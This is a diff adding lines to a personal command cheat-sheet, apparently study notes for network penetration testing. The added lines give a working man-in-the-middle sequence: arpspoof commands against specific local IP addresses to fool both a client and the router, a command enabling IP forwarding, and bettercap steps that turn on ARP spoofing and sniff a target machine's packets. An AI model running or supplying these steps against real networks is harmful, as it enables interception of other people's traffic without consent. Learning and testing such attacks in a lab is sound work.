@@ -3,5 +3,32 @@ iwconfig                             (shows the wifi connected ip details)
 ifconfig down                        (makes the network down we will change the configuration of the netowrk)
 ifconfig up                          (turns on the network connection)
 netdiscover -r (range)               (dicover the client networks in the same network)
-arp -a                               (shows the arp table)
+arp -a                               (shows the arp gateway)
+arpspoof -i                          (interface)              
+arpspoof -t                          (target)
+arpspoof -i wlan0(for wifi) or eth0 (wired) -t 192.168.201.61 192.168.201.158     (for arpspoof to fool the client)
+arpspoof -i wlan0(for wifi) or eth0 (wired) -t 192.168.201.158 192.168.201.61     (for fool the router)
+echo 1 > /proc/sys/net/ipv4/ip_forward                                            (for port forwarding)
 
+
+BETTERCAP TOOL>>>>>>>
+bettercap                            (shows the bettercap details)
+bettercap -iface wlan0               (shows the wifi network gateway monitor as started)
+net.probe on                         (turn on to see the network traffics )
+net.show                             (show the client network details it is target machine )
+set (option name) true or false      (modify the bettercap modules)
+arp.spoof on                         (to start the target for attack)
+net.sniff on                         (to shows the packets what going on target machine)
+
+
+
+
+
+
+
+
+
+
+
+
+ <<<<<   N M A P   >>>>
